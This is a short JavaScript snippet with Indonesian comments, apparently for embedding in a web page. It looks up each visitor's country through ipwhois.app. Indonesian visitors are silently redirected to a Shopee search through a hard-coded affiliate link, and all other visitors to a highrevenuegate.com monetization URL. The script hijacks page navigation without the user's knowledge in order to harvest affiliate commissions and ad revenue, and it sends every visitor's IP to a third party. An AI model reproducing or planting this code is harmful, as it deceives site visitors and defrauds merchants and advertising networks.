// 1. Mendapatkan kata kunci pencarian dari URL
var keyword = '';
var url = window.location.href;
if (url.includes('/search/q=')) {
  keyword = url.split('/search/q=')[1].split('&')[0];
}

// 2. Mendapatkan IP negara menggunakan ipwhois
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://ipwhois.app/json/', true);
xhr.onload = function () {
  if (xhr.status === 200) {
    var response = JSON.parse(xhr.responseText);
    var countryCode = response.country_code;
    
    // 3. Jika IP negara Indonesia, redirect ke https://shope.ee/an_redir?origin_link=...
    if (countryCode === 'ID') {
      var shopeeUrl = 'https://shopee.co.id/search?filters=5%2C6%2C7&keyword=' + keyword;
      var redirectUrl = 'https://shope.ee/an_redir?origin_link=' + encodeURIComponent(shopeeUrl) + '&affiliate_id=11369620275&sub_id=RacunBelanja-14-03-20-23';
      window.location.replace(redirectUrl);
    } else {
      // 4. Jika IP bukan negara Indonesia, redirect ke https://www.highrevenuegate.com/ix4w14mn00?key=...
      var redirectUrl = 'https://www.highrevenuegate.com/ix4w14mn00?key=0647c1ed9e0e63fde67b1b37272c2227';
      window.location.replace(redirectUrl);
    }
  } else {
    console.error(xhr.statusText);
  }
};
xhr.onerror = function () {
  console.error(xhr.statusText);
};
xhr.send();
